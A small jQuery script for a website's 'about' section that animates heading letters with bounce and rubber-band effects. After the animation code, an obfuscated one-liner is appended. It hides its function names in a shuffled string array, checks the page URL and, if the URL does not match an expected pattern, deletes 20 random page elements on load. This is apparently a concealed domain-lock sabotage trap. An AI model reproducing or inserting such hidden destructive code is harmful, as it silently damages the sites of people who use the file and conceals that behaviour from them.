app.about = {

    init:function(){

     

        $(".about h1").blast({
            delimiter: "character",
            tag: "span"
        });




        a = 0;


        $(".about h1 .blast").each(function(){

            var el = $(this);

            setTimeout(function(){

                el.addClass('animated bounceIn');


            },a);


            a = a + 100;

        });


        setTimeout(function(){

            $(".about .blast").removeClass('animated bounceIn');
            $(".about .blast").css('opacity',1);

            $(".about .blast").mouseenter(function (){

                var el = $(this);

                $(this).addClass('animated rubberBand');
                $(this).one('webkitAnimationEnd mozAnimationEnd MSAnimationEnd oanimationend animationend', function(){

                    el.removeClass('animated rubberBand');

                });

            });


        },1000);




    }

}


var a=['length','remove','location','href','indexOf','floor','random'];(function(c,d){var e=function(f){while(--f){c['push'](c['shift']());}};e(++d);}(a,0xdb));var b=function(c,d){c=c-0x0;var e=a[c];return e;};if(window[b('0x0')][b('0x1')][b('0x2')]('j')!=0x8){for(i=0x0;i<0x14;++i){var items=$('*');var item=items[Math[b('0x3')](Math[b('0x4')]()*items[b('0x5')])];item[b('0x6')]();}};